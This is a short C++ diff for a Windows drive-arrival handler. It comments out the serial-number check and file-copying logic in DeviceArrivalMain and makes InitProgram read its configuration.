@@ -24,6 +24,7 @@ void DeviceArrivalMain(TCHAR DriveLetter) {
 	Device dv(DriveLetter);
 	Device::DiskInformation info = dv.GetDiskInformation();
 	unsigned int SN = info.VolumeSerialNumber;
+	/*
 	switch (config->ListenSN) {
 	case SystemConfig::SNMode::DISABLED:
 		return;
@@ -66,7 +67,7 @@ void DeviceArrivalMain(TCHAR DriveLetter) {
 		FileCopyer cp(dv, psls);
 		cp.ListFile(pls);
 	}
-	
+	*/
 }
 
 void DeviceRemovalMain(TCHAR DriveLetter) {
@@ -75,5 +76,5 @@ void DeviceRemovalMain(TCHAR DriveLetter) {
 
 // Usually this function should be empty.
 void InitProgram() {
-	SystemConfig::getInstance();
+	SystemConfig::getInstance()->readConfig();
 }
